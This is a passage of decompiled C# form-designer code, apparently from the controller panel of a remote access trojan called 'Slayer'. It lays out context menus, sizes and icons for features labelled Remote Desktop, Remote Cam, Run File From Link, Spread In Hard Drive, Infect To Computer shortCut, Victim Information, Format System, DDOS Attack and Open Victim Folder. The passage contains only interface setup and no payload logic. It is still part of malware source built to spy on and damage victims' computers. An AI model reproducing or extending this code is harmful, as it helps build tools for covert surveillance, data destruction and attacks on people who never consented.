				this.RemoteCamToolStripMenuItem,
				this.RunFileToolStripMenuItem,
				this.ToolStripSeparator2,
				this.SpreadInHardDriveToolStripMenuItem1,
				this.InjectToDesctopShortcutToolStripMenuItem,
				this.VictimInformationToolStripMenuItem,
				this.ToolStripSeparator4,
				this.ExtrasToolStripMenuItem,
				this.FormatSystemToolStripMenuItem,
				this.WebsiteToolStripMenuItem,
				this.DDosAttickToolStripMenuItem,
				this.OpenChatToolStripMenuItem,
				this.ToolStripSeparator3,
				this.ServerToolStripMenuItem,
				this.ChangeVictimColorToolStripMenuItem,
				this.ToolStripSeparator1,
				this.ToolStripMenuItem2
			});
			this.ContextMenuStrip1.Name = "ContextMenuStrip1";
			Control arg_DB9_0 = this.ContextMenuStrip1;
			size = new Size(236, 336);
			arg_DB9_0.Size = size;
			this.RemoteDesktopToolStripMenuItem.BackColor = Color.Black;
			this.RemoteDesktopToolStripMenuItem.ForeColor = Color.White;
			this.RemoteDesktopToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("RemoteDesktopToolStripMenuItem.Image");
			this.RemoteDesktopToolStripMenuItem.Name = "RemoteDesktopToolStripMenuItem";
			ToolStripItem arg_E26_0 = this.RemoteDesktopToolStripMenuItem;
			size = new Size(235, 22);
			arg_E26_0.Size = size;
			this.RemoteDesktopToolStripMenuItem.Text = "[Remote Desktop]";
			this.RemoteCamToolStripMenuItem.BackColor = Color.Black;
			this.RemoteCamToolStripMenuItem.ForeColor = Color.White;
			this.RemoteCamToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("RemoteCamToolStripMenuItem.Image");
			this.RemoteCamToolStripMenuItem.Name = "RemoteCamToolStripMenuItem";
			ToolStripItem arg_EA4_0 = this.RemoteCamToolStripMenuItem;
			size = new Size(235, 22);
			arg_EA4_0.Size = size;
			this.RemoteCamToolStripMenuItem.Text = "[Remote Cam]]";
			this.RunFileToolStripMenuItem.BackColor = Color.Black;
			this.RunFileToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[]
			{
				this.FromLinkToolStripMenuItem,
				this.FromDiskToolStripMenuItem,
				this.ScriptToolStripMenuItem
			});
			this.RunFileToolStripMenuItem.ForeColor = Color.White;
			this.RunFileToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("RunFileToolStripMenuItem.Image");
			this.RunFileToolStripMenuItem.Name = "RunFileToolStripMenuItem";
			ToolStripItem arg_F5E_0 = this.RunFileToolStripMenuItem;
			size = new Size(235, 22);
			arg_F5E_0.Size = size;
			this.RunFileToolStripMenuItem.Text = "[Run File]";
			this.FromLinkToolStripMenuItem.BackColor = Color.Black;
			this.FromLinkToolStripMenuItem.ForeColor = Color.White;
			this.FromLinkToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("FromLinkToolStripMenuItem.Image");
			this.FromLinkToolStripMenuItem.Name = "FromLinkToolStripMenuItem";
			ToolStripItem arg_FDC_0 = this.FromLinkToolStripMenuItem;
			size = new Size(135, 22);
			arg_FDC_0.Size = size;
			this.FromLinkToolStripMenuItem.Text = "[From Link]";
			this.FromDiskToolStripMenuItem.BackColor = Color.Black;
			this.FromDiskToolStripMenuItem.ForeColor = Color.White;
			this.FromDiskToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("FromDiskToolStripMenuItem.Image");
			this.FromDiskToolStripMenuItem.Name = "FromDiskToolStripMenuItem";
			ToolStripItem arg_105A_0 = this.FromDiskToolStripMenuItem;
			size = new Size(135, 22);
			arg_105A_0.Size = size;
			this.FromDiskToolStripMenuItem.Text = "[From Disk]";
			this.ScriptToolStripMenuItem.BackColor = Color.Black;
			this.ScriptToolStripMenuItem.ForeColor = Color.White;
			this.ScriptToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("ScriptToolStripMenuItem.Image");
			this.ScriptToolStripMenuItem.Name = "ScriptToolStripMenuItem";
			ToolStripItem arg_10D8_0 = this.ScriptToolStripMenuItem;
			size = new Size(135, 22);
			arg_10D8_0.Size = size;
			this.ScriptToolStripMenuItem.Text = "[Script]";
			this.ToolStripSeparator2.Name = "ToolStripSeparator2";
			ToolStripItem arg_1116_0 = this.ToolStripSeparator2;
			size = new Size(232, 6);
			arg_1116_0.Size = size;
			this.SpreadInHardDriveToolStripMenuItem1.BackColor = Color.Black;
			this.SpreadInHardDriveToolStripMenuItem1.ForeColor = Color.White;
			this.SpreadInHardDriveToolStripMenuItem1.Image = (Image)componentResourceManager.GetObject("SpreadInHardDriveToolStripMenuItem1.Image");
			this.SpreadInHardDriveToolStripMenuItem1.Name = "SpreadInHardDriveToolStripMenuItem1";
			ToolStripItem arg_1183_0 = this.SpreadInHardDriveToolStripMenuItem1;
			size = new Size(235, 22);
			arg_1183_0.Size = size;
			this.SpreadInHardDriveToolStripMenuItem1.Text = "[Spread In Hard Drive]";
			this.InjectToDesctopShortcutToolStripMenuItem.BackColor = Color.Black;
			this.InjectToDesctopShortcutToolStripMenuItem.ForeColor = Color.White;
			this.InjectToDesctopShortcutToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("InjectToDesctopShortcutToolStripMenuItem.Image");
			this.InjectToDesctopShortcutToolStripMenuItem.Name = "InjectToDesctopShortcutToolStripMenuItem";
			ToolStripItem arg_1201_0 = this.InjectToDesctopShortcutToolStripMenuItem;
			size = new Size(235, 22);
			arg_1201_0.Size = size;
			this.InjectToDesctopShortcutToolStripMenuItem.Text = "[Infect To Computer shortCut]";
			this.VictimInformationToolStripMenuItem.ForeColor = Color.White;
			this.VictimInformationToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("VictimInformationToolStripMenuItem.Image");
			this.VictimInformationToolStripMenuItem.Name = "VictimInformationToolStripMenuItem";
			ToolStripItem arg_126E_0 = this.VictimInformationToolStripMenuItem;
			size = new Size(235, 22);
			arg_126E_0.Size = size;
			this.VictimInformationToolStripMenuItem.Text = "[Victim Information]";
			this.ToolStripSeparator4.Name = "ToolStripSeparator4";
			ToolStripItem arg_12AC_0 = this.ToolStripSeparator4;
			size = new Size(232, 6);
			arg_12AC_0.Size = size;
			this.ExtrasToolStripMenuItem.BackColor = Color.Black;
			this.ExtrasToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[]
			{
				this.SendMsgboxToolStripMenuItem,
				this.TextToSpeechToolStripMenuItem,
				this.TaskbarToolStripMenuItem,
				this.ComputerToolStripMenuItem1,
				this.CDToolStripMenuItem
			});
			this.ExtrasToolStripMenuItem.ForeColor = Color.White;
			this.ExtrasToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("ExtrasToolStripMenuItem.Image");
			this.ExtrasToolStripMenuItem.Name = "ExtrasToolStripMenuItem";
			ToolStripItem arg_136B_0 = this.ExtrasToolStripMenuItem;
			size = new Size(235, 22);
			arg_136B_0.Size = size;
			this.ExtrasToolStripMenuItem.Text = "[Funny/Extras]";
			this.SendMsgboxToolStripMenuItem.BackColor = SystemColors.ActiveCaptionText;
			this.SendMsgboxToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[]
			{
				this.ErrorMessageToolStripMenuItem,
				this.InformationMessageToolStripMenuItem,
				this.QuestionMessageToolStripMenuItem,
				this.ExlamationMessageToolStripMenuItem
			});
			this.SendMsgboxToolStripMenuItem.ForeColor = Color.White;
			this.SendMsgboxToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("SendMsgboxToolStripMenuItem.Image");
			this.SendMsgboxToolStripMenuItem.Name = "SendMsgboxToolStripMenuItem";
			ToolStripItem arg_1430_0 = this.SendMsgboxToolStripMenuItem;
			size = new Size(162, 22);
			arg_1430_0.Size = size;
			this.SendMsgboxToolStripMenuItem.Text = "[Send Msgbox]";
			this.ErrorMessageToolStripMenuItem.BackColor = SystemColors.ActiveCaptionText;
			this.ErrorMessageToolStripMenuItem.ForeColor = Color.White;
			this.ErrorMessageToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("ErrorMessageToolStripMenuItem.Image");
			this.ErrorMessageToolStripMenuItem.Name = "ErrorMessageToolStripMenuItem";
			ToolStripItem arg_14AE_0 = this.ErrorMessageToolStripMenuItem;
			size = new Size(194, 22);
			arg_14AE_0.Size = size;
			this.ErrorMessageToolStripMenuItem.Text = "[Error Message]";
			this.InformationMessageToolStripMenuItem.BackColor = SystemColors.ActiveCaptionText;
			this.InformationMessageToolStripMenuItem.ForeColor = Color.White;
			this.InformationMessageToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("InformationMessageToolStripMenuItem.Image");
			this.InformationMessageToolStripMenuItem.Name = "InformationMessageToolStripMenuItem";
			ToolStripItem arg_152C_0 = this.InformationMessageToolStripMenuItem;
			size = new Size(194, 22);
			arg_152C_0.Size = size;
			this.InformationMessageToolStripMenuItem.Text = "[Information message]";
			this.QuestionMessageToolStripMenuItem.BackColor = SystemColors.ActiveCaptionText;
			this.QuestionMessageToolStripMenuItem.ForeColor = Color.White;
			this.QuestionMessageToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("QuestionMessageToolStripMenuItem.Image");
			this.QuestionMessageToolStripMenuItem.Name = "QuestionMessageToolStripMenuItem";
			ToolStripItem arg_15AA_0 = this.QuestionMessageToolStripMenuItem;
			size = new Size(194, 22);
			arg_15AA_0.Size = size;
			this.QuestionMessageToolStripMenuItem.Text = "[Question Message]";
			this.ExlamationMessageToolStripMenuItem.BackColor = SystemColors.ActiveCaptionText;
			this.ExlamationMessageToolStripMenuItem.ForeColor = Color.White;
			this.ExlamationMessageToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("ExlamationMessageToolStripMenuItem.Image");
			this.ExlamationMessageToolStripMenuItem.Name = "ExlamationMessageToolStripMenuItem";
			ToolStripItem arg_1628_0 = this.ExlamationMessageToolStripMenuItem;
			size = new Size(194, 22);
			arg_1628_0.Size = size;
			this.ExlamationMessageToolStripMenuItem.Text = "[Exlamation Message]";
			this.TextToSpeechToolStripMenuItem.BackColor = SystemColors.ActiveCaptionText;
			this.TextToSpeechToolStripMenuItem.ForeColor = Color.White;
			this.TextToSpeechToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("TextToSpeechToolStripMenuItem.Image");
			this.TextToSpeechToolStripMenuItem.Name = "TextToSpeechToolStripMenuItem";
			ToolStripItem arg_16A6_0 = this.TextToSpeechToolStripMenuItem;
			size = new Size(162, 22);
			arg_16A6_0.Size = size;
			this.TextToSpeechToolStripMenuItem.Text = "[Text To Speech]";
			this.TaskbarToolStripMenuItem.BackColor = SystemColors.ActiveCaptionText;
			this.TaskbarToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[]
			{
				this.HideToolStripMenuItem,
				this.ShowToolStripMenuItem1
			});
			this.TaskbarToolStripMenuItem.ForeColor = Color.White;
			this.TaskbarToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("TaskbarToolStripMenuItem.Image");
			this.TaskbarToolStripMenuItem.Name = "TaskbarToolStripMenuItem";
			ToolStripItem arg_1755_0 = this.TaskbarToolStripMenuItem;
			size = new Size(162, 22);
			arg_1755_0.Size = size;
			this.TaskbarToolStripMenuItem.Text = "[Taskbar]";
			this.HideToolStripMenuItem.BackColor = SystemColors.ActiveCaptionText;
			this.HideToolStripMenuItem.ForeColor = Color.White;
			this.HideToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("HideToolStripMenuItem.Image");
			this.HideToolStripMenuItem.Name = "HideToolStripMenuItem";
			ToolStripItem arg_17D0_0 = this.HideToolStripMenuItem;
			size = new Size(111, 22);
			arg_17D0_0.Size = size;
			this.HideToolStripMenuItem.Text = "[Hide]";
			this.ShowToolStripMenuItem1.BackColor = SystemColors.ActiveCaptionText;
			this.ShowToolStripMenuItem1.ForeColor = Color.White;
			this.ShowToolStripMenuItem1.Image = (Image)componentResourceManager.GetObject("ShowToolStripMenuItem1.Image");
			this.ShowToolStripMenuItem1.Name = "ShowToolStripMenuItem1";
			ToolStripItem arg_184B_0 = this.ShowToolStripMenuItem1;
			size = new Size(111, 22);
			arg_184B_0.Size = size;
			this.ShowToolStripMenuItem1.Text = "[Show]";
			this.ComputerToolStripMenuItem1.BackColor = SystemColors.ActiveCaptionText;
			this.ComputerToolStripMenuItem1.DropDownItems.AddRange(new ToolStripItem[]
			{
				this.ShutDownToolStripMenuItem1,
				this.RestartToolStripMenuItem1,
				this.LogOffToolStripMenuItem
			});
			this.ComputerToolStripMenuItem1.ForeColor = Color.White;
			this.ComputerToolStripMenuItem1.Image = (Image)componentResourceManager.GetObject("ComputerToolStripMenuItem1.Image");
			this.ComputerToolStripMenuItem1.Name = "ComputerToolStripMenuItem1";
			ToolStripItem arg_1905_0 = this.ComputerToolStripMenuItem1;
			size = new Size(162, 22);
			arg_1905_0.Size = size;
			this.ComputerToolStripMenuItem1.Text = "[Computer]";
			this.ShutDownToolStripMenuItem1.BackColor = SystemColors.ActiveCaptionText;
			this.ShutDownToolStripMenuItem1.ForeColor = Color.White;
			this.ShutDownToolStripMenuItem1.Image = (Image)componentResourceManager.GetObject("ShutDownToolStripMenuItem1.Image");
			this.ShutDownToolStripMenuItem1.Name = "ShutDownToolStripMenuItem1";
			ToolStripItem arg_1983_0 = this.ShutDownToolStripMenuItem1;
			size = new Size(137, 22);
			arg_1983_0.Size = size;
			this.ShutDownToolStripMenuItem1.Text = "[ShutDown]";
			this.RestartToolStripMenuItem1.BackColor = SystemColors.ActiveCaptionText;
			this.RestartToolStripMenuItem1.ForeColor = Color.White;
			this.RestartToolStripMenuItem1.Image = (Image)componentResourceManager.GetObject("RestartToolStripMenuItem1.Image");
			this.RestartToolStripMenuItem1.Name = "RestartToolStripMenuItem1";
			ToolStripItem arg_1A01_0 = this.RestartToolStripMenuItem1;
			size = new Size(137, 22);
			arg_1A01_0.Size = size;
			this.RestartToolStripMenuItem1.Text = "[Restart]";
			this.LogOffToolStripMenuItem.BackColor = SystemColors.ActiveCaptionText;
			this.LogOffToolStripMenuItem.ForeColor = Color.White;
			this.LogOffToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("LogOffToolStripMenuItem.Image");
			this.LogOffToolStripMenuItem.Name = "LogOffToolStripMenuItem";
			ToolStripItem arg_1A7F_0 = this.LogOffToolStripMenuItem;
			size = new Size(137, 22);
			arg_1A7F_0.Size = size;
			this.LogOffToolStripMenuItem.Text = "[Log Off]";
			this.CDToolStripMenuItem.BackColor = SystemColors.ActiveCaptionText;
			this.CDToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[]
			{
				this.OpenCDToolStripMenuItem,
				this.CloseCDToolStripMenuItem
			});
			this.CDToolStripMenuItem.ForeColor = Color.White;
			this.CDToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("CDToolStripMenuItem.Image");
			this.CDToolStripMenuItem.Name = "CDToolStripMenuItem";
			ToolStripItem arg_1B2E_0 = this.CDToolStripMenuItem;
			size = new Size(162, 22);
			arg_1B2E_0.Size = size;
			this.CDToolStripMenuItem.Text = "[CD Player]";
			this.OpenCDToolStripMenuItem.BackColor = SystemColors.ActiveCaptionText;
			this.OpenCDToolStripMenuItem.ForeColor = Color.White;
			this.OpenCDToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("OpenCDToolStripMenuItem.Image");
			this.OpenCDToolStripMenuItem.Name = "OpenCDToolStripMenuItem";
			ToolStripItem arg_1BAC_0 = this.OpenCDToolStripMenuItem;
			size = new Size(130, 22);
			arg_1BAC_0.Size = size;
			this.OpenCDToolStripMenuItem.Text = "[Open CD]";
			this.CloseCDToolStripMenuItem.BackColor = SystemColors.ActiveCaptionText;
			this.CloseCDToolStripMenuItem.ForeColor = Color.White;
			this.CloseCDToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("CloseCDToolStripMenuItem.Image");
			this.CloseCDToolStripMenuItem.Name = "CloseCDToolStripMenuItem";
			ToolStripItem arg_1C2A_0 = this.CloseCDToolStripMenuItem;
			size = new Size(130, 22);
			arg_1C2A_0.Size = size;
			this.CloseCDToolStripMenuItem.Text = "[Close CD]";
			this.FormatSystemToolStripMenuItem.BackColor = Color.Black;
			this.FormatSystemToolStripMenuItem.ForeColor = Color.White;
			this.FormatSystemToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("FormatSystemToolStripMenuItem.Image");
			this.FormatSystemToolStripMenuItem.Name = "FormatSystemToolStripMenuItem";
			ToolStripItem arg_1CA8_0 = this.FormatSystemToolStripMenuItem;
			size = new Size(235, 22);
			arg_1CA8_0.Size = size;
			this.FormatSystemToolStripMenuItem.Text = "[Format System]";
			this.WebsiteToolStripMenuItem.BackColor = Color.Black;
			this.WebsiteToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[]
			{
				this.OpenWebPageToolStripMenuItem1,
				this.BlockWebpageToolStripMenuItem
			});
			this.WebsiteToolStripMenuItem.ForeColor = Color.White;
			this.WebsiteToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("WebsiteToolStripMenuItem.Image");
			this.WebsiteToolStripMenuItem.Name = "WebsiteToolStripMenuItem";
			ToolStripItem arg_1D57_0 = this.WebsiteToolStripMenuItem;
			size = new Size(235, 22);
			arg_1D57_0.Size = size;
			this.WebsiteToolStripMenuItem.Text = "[Website]";
			this.OpenWebPageToolStripMenuItem1.BackColor = SystemColors.ActiveCaptionText;
			this.OpenWebPageToolStripMenuItem1.ForeColor = Color.White;
			this.OpenWebPageToolStripMenuItem1.Image = (Image)componentResourceManager.GetObject("OpenWebPageToolStripMenuItem1.Image");
			this.OpenWebPageToolStripMenuItem1.Name = "OpenWebPageToolStripMenuItem1";
			ToolStripItem arg_1DD5_0 = this.OpenWebPageToolStripMenuItem1;
			size = new Size(164, 22);
			arg_1DD5_0.Size = size;
			this.OpenWebPageToolStripMenuItem1.Text = "[Open WebPage]";
			this.BlockWebpageToolStripMenuItem.BackColor = SystemColors.ActiveCaptionText;
			this.BlockWebpageToolStripMenuItem.ForeColor = Color.White;
			this.BlockWebpageToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("BlockWebpageToolStripMenuItem.Image");
			this.BlockWebpageToolStripMenuItem.Name = "BlockWebpageToolStripMenuItem";
			ToolStripItem arg_1E53_0 = this.BlockWebpageToolStripMenuItem;
			size = new Size(164, 22);
			arg_1E53_0.Size = size;
			this.BlockWebpageToolStripMenuItem.Text = "[Block Webpage]";
			this.DDosAttickToolStripMenuItem.BackColor = Color.Black;
			this.DDosAttickToolStripMenuItem.ForeColor = Color.White;
			this.DDosAttickToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("DDosAttickToolStripMenuItem.Image");
			this.DDosAttickToolStripMenuItem.Name = "DDosAttickToolStripMenuItem";
			ToolStripItem arg_1ED1_0 = this.DDosAttickToolStripMenuItem;
			size = new Size(235, 22);
			arg_1ED1_0.Size = size;
			this.DDosAttickToolStripMenuItem.Text = "[DDOS Attack]";
			this.OpenChatToolStripMenuItem.BackColor = Color.Black;
			this.OpenChatToolStripMenuItem.ForeColor = Color.White;
			this.OpenChatToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("OpenChatToolStripMenuItem.Image");
			this.OpenChatToolStripMenuItem.Name = "OpenChatToolStripMenuItem";
			ToolStripItem arg_1F4F_0 = this.OpenChatToolStripMenuItem;
			size = new Size(235, 22);
			arg_1F4F_0.Size = size;
			this.OpenChatToolStripMenuItem.Text = "[Open Chat]";
			this.ToolStripSeparator3.Name = "ToolStripSeparator3";
			ToolStripItem arg_1F8D_0 = this.ToolStripSeparator3;
			size = new Size(232, 6);
			arg_1F8D_0.Size = size;
			this.ServerToolStripMenuItem.BackColor = Color.Black;
			this.ServerToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[]
			{
				this.UpdateToolStripMenuItem,
				this.UninstallToolStripMenuItem,
				this.RestartToolStripMenuItem,
				this.CloseToolStripMenuItem,
				this.DisconnectToolStripMenuItem,
				this.RenameToolStripMenuItem
			});
			this.ServerToolStripMenuItem.Font = new Font("Segoe UI", 9f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.ServerToolStripMenuItem.ForeColor = Color.White;
			this.ServerToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("ServerToolStripMenuItem.Image");
			this.ServerToolStripMenuItem.Name = "ServerToolStripMenuItem";
			ToolStripItem arg_2075_0 = this.ServerToolStripMenuItem;
			size = new Size(235, 22);
			arg_2075_0.Size = size;
			this.ServerToolStripMenuItem.Text = "[Server]";
			this.UpdateToolStripMenuItem.BackColor = Color.Black;
			this.UpdateToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[]
			{
				this.FromDISKToolStripMenuItem1,
				this.FromLINKToolStripMenuItem1
			});
			this.UpdateToolStripMenuItem.ForeColor = Color.White;
			this.UpdateToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("UpdateToolStripMenuItem.Image");
			this.UpdateToolStripMenuItem.Name = "UpdateToolStripMenuItem";
			ToolStripItem arg_2124_0 = this.UpdateToolStripMenuItem;
			size = new Size(141, 22);
			arg_2124_0.Size = size;
			this.UpdateToolStripMenuItem.Text = "[Update]";
			this.FromDISKToolStripMenuItem1.BackColor = SystemColors.ActiveCaptionText;
			this.FromDISKToolStripMenuItem1.ForeColor = Color.White;
			this.FromDISKToolStripMenuItem1.Image = (Image)componentResourceManager.GetObject("FromDISKToolStripMenuItem1.Image");
			this.FromDISKToolStripMenuItem1.Name = "FromDISKToolStripMenuItem1";
			ToolStripItem arg_21A2_0 = this.FromDISKToolStripMenuItem1;
			size = new Size(139, 22);
			arg_21A2_0.Size = size;
			this.FromDISKToolStripMenuItem1.Text = "[From Disk]";
			this.FromLINKToolStripMenuItem1.BackColor = SystemColors.ActiveCaptionText;
			this.FromLINKToolStripMenuItem1.ForeColor = Color.White;
			this.FromLINKToolStripMenuItem1.Image = (Image)componentResourceManager.GetObject("FromLINKToolStripMenuItem1.Image");
			this.FromLINKToolStripMenuItem1.Name = "FromLINKToolStripMenuItem1";
			ToolStripItem arg_2220_0 = this.FromLINKToolStripMenuItem1;
			size = new Size(139, 22);
			arg_2220_0.Size = size;
			this.FromLINKToolStripMenuItem1.Text = "[From Link]]";
			this.UninstallToolStripMenuItem.BackColor = Color.Black;
			this.UninstallToolStripMenuItem.ForeColor = Color.White;
			this.UninstallToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("UninstallToolStripMenuItem.Image");
			this.UninstallToolStripMenuItem.Name = "UninstallToolStripMenuItem";
			ToolStripItem arg_229E_0 = this.UninstallToolStripMenuItem;
			size = new Size(141, 22);
			arg_229E_0.Size = size;
			this.UninstallToolStripMenuItem.Text = "[Uninstall]";
			this.RestartToolStripMenuItem.BackColor = Color.Black;
			this.RestartToolStripMenuItem.ForeColor = Color.White;
			this.RestartToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("RestartToolStripMenuItem.Image");
			this.RestartToolStripMenuItem.Name = "RestartToolStripMenuItem";
			ToolStripItem arg_231C_0 = this.RestartToolStripMenuItem;
			size = new Size(141, 22);
			arg_231C_0.Size = size;
			this.RestartToolStripMenuItem.Text = "[Restart]";
			this.CloseToolStripMenuItem.BackColor = Color.Black;
			this.CloseToolStripMenuItem.ForeColor = Color.White;
			this.CloseToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("CloseToolStripMenuItem.Image");
			this.CloseToolStripMenuItem.Name = "CloseToolStripMenuItem";
			ToolStripItem arg_239A_0 = this.CloseToolStripMenuItem;
			size = new Size(141, 22);
			arg_239A_0.Size = size;
			this.CloseToolStripMenuItem.Text = "[Close]";
			this.DisconnectToolStripMenuItem.BackColor = Color.Black;
			this.DisconnectToolStripMenuItem.ForeColor = Color.White;
			this.DisconnectToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("DisconnectToolStripMenuItem.Image");
			this.DisconnectToolStripMenuItem.Name = "DisconnectToolStripMenuItem";
			ToolStripItem arg_2418_0 = this.DisconnectToolStripMenuItem;
			size = new Size(141, 22);
			arg_2418_0.Size = size;
			this.DisconnectToolStripMenuItem.Text = "[Disconnect]";
			this.RenameToolStripMenuItem.BackColor = Color.Black;
			this.RenameToolStripMenuItem.ForeColor = Color.White;
			this.RenameToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("RenameToolStripMenuItem.Image");
			this.RenameToolStripMenuItem.Name = "RenameToolStripMenuItem";
			ToolStripItem arg_2496_0 = this.RenameToolStripMenuItem;
			size = new Size(141, 22);
			arg_2496_0.Size = size;
			this.RenameToolStripMenuItem.Text = "[Rename]";
			this.ChangeVictimColorToolStripMenuItem.BackColor = Color.Black;
			this.ChangeVictimColorToolStripMenuItem.ForeColor = Color.White;
			this.ChangeVictimColorToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("ChangeVictimColorToolStripMenuItem.Image");
			this.ChangeVictimColorToolStripMenuItem.Name = "ChangeVictimColorToolStripMenuItem";
			ToolStripItem arg_2514_0 = this.ChangeVictimColorToolStripMenuItem;
			size = new Size(235, 22);
			arg_2514_0.Size = size;
			this.ChangeVictimColorToolStripMenuItem.Text = "[Change Victim Color]";
			this.ToolStripSeparator1.Name = "ToolStripSeparator1";
			ToolStripItem arg_2552_0 = this.ToolStripSeparator1;
			size = new Size(232, 6);
			arg_2552_0.Size = size;
			this.ToolStripMenuItem2.BackColor = Color.Black;
			this.ToolStripMenuItem2.ForeColor = Color.White;
			this.ToolStripMenuItem2.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem2.Image");
			this.ToolStripMenuItem2.Name = "ToolStripMenuItem2";
			ToolStripItem arg_25BF_0 = this.ToolStripMenuItem2;
			size = new Size(235, 22);
			arg_25BF_0.Size = size;
			this.ToolStripMenuItem2.Text = "[Open Victim Folder]";
			this.CM3.BackColor = Color.Black;
			this.CM3.Items.AddRange(new ToolStripItem[]
			{
				this.HideMonitorToolStripMenuItem,
				this.ToolStripSeparator6,
				this.ShowMonitorToolStripMenuItem
			});
			this.CM3.Name = "CM3";
			Control arg_264B_0 = this.CM3;
			size = new Size(158, 54);
			arg_264B_0.Size = size;
			this.HideMonitorToolStripMenuItem.BackColor = Color.Black;
			this.HideMonitorToolStripMenuItem.ForeColor = Color.White;
			this.HideMonitorToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("HideMonitorToolStripMenuItem.Image");
			this.HideMonitorToolStripMenuItem.Name = "HideMonitorToolStripMenuItem";
			ToolStripItem arg_26B8_0 = this.HideMonitorToolStripMenuItem;
			size = new Size(157, 22);
			arg_26B8_0.Size = size;
			this.HideMonitorToolStripMenuItem.Text = "[Hide Monitor]";
			this.ToolStripSeparator6.Name = "ToolStripSeparator6";
			ToolStripItem arg_26F6_0 = this.ToolStripSeparator6;
			size = new Size(154, 6);
			arg_26F6_0.Size = size;
			this.ShowMonitorToolStripMenuItem.BackColor = Color.Black;
			this.ShowMonitorToolStripMenuItem.ForeColor = Color.White;
			this.ShowMonitorToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("ShowMonitorToolStripMenuItem.Image");
			this.ShowMonitorToolStripMenuItem.Name = "ShowMonitorToolStripMenuItem";
			ToolStripItem arg_2763_0 = this.ShowMonitorToolStripMenuItem;
			size = new Size(157, 22);
			arg_2763_0.Size = size;
			this.ShowMonitorToolStripMenuItem.Text = "[Show Monitor]";
			this.im1.ImageStream = (ImageListStreamer)componentResourceManager.GetObject("im1.ImageStream");
			this.im1.TransparentColor = Color.Transparent;
			this.im1.Images.SetKeyName(0, "archive.ico");
			this.im1.Images.SetKeyName(1, "@.ico");
			this.im1.Images.SetKeyName(2, "windows.ico");
			this.im1.Images.SetKeyName(3, "admin.png");
			this.im1.Images.SetKeyName(4, "ip2.png");
			this.im1.Images.SetKeyName(5, "admin.png");
			this.im1.Images.SetKeyName(6, "processos2.png");
			this.im1.Images.SetKeyName(7, "net2.jpg");
			this.im1.Images.SetKeyName(8, "offine.jpg");
			this.im1.Images.SetKeyName(9, "windows.ico");
			this.im1.Images.SetKeyName(10, "tun.ico");
			this.im1.Images.SetKeyName(11, "Tpdkdesign.net-Refresh-Cl-System-Install-1.ico");
			this.im1.Images.SetKeyName(12, "001.png");
			this.im1.Images.SetKeyName(13, "1359145624_link_add.png");
			this.im1.Images.SetKeyName(14, "CAM.ico");
			this.im1.Images.SetKeyName(15, "Hopstarter-Soft-Scraps-USB.ico");
			this.im1.Images.SetKeyName(16, "prnfldr_242.ico");
			this.im1.Images.SetKeyName(17, "prnfldr_5007.ico");
			this.im1.Images.SetKeyName(18, "prnfldr_244.ico");
			this.im1.Images.SetKeyName(19, "prnfldr_5002.ico");
			this.im1.Images.SetKeyName(20, "04.png");
			this.im1.Images.SetKeyName(21, "06.png");
			this.im1.Images.SetKeyName(22, "15.png");
			this.im1.Images.SetKeyName(23, "Oxygen-Icons.org-Oxygen-Places-folder-blue.ico");
			this.im1.Images.SetKeyName(24, "04.png");
			this.im1.Images.SetKeyName(25, "Astahrr-Nfl-Eagles.ico");
			this.im1.Images.SetKeyName(26, "css.ico");
			this.im1.Images.SetKeyName(27, "bbl.ico");
			this.im1.Images.SetKeyName(28, "blue.ico");
			this.im1.Images.SetKeyName(29, "Semlabs-Web-Blog-User-male-white-red-brown.ico");
			this.im1.Images.SetKeyName(30, "shea.ico");
			this.im1.Images.SetKeyName(31, "ss.ico");
			this.im1.Images.SetKeyName(32, "CAM.ico");
			this.IMG.ColorDepth = ColorDepth.Depth32Bit;
			ImageList arg_2AD9_0 = this.IMG;
			size = new Size(20, 20);
			arg_2AD9_0.ImageSize = size;
			this.IMG.TransparentColor = Color.Transparent;
			this.NotifyIcon1.Icon = (Icon)componentResourceManager.GetObject("NotifyIcon1.Icon");
			this.NotifyIcon1.Text = "Slayer";
			this.NotifyIcon1.Visible = true;
			this.P1.BackColor = Color.Black;
			this.P1.BackgroundImageLayout = ImageLayout.Stretch;
			this.P1.BorderStyle = BorderStyle.FixedSingle;
			this.P1.ContextMenuStrip = this.CM3;
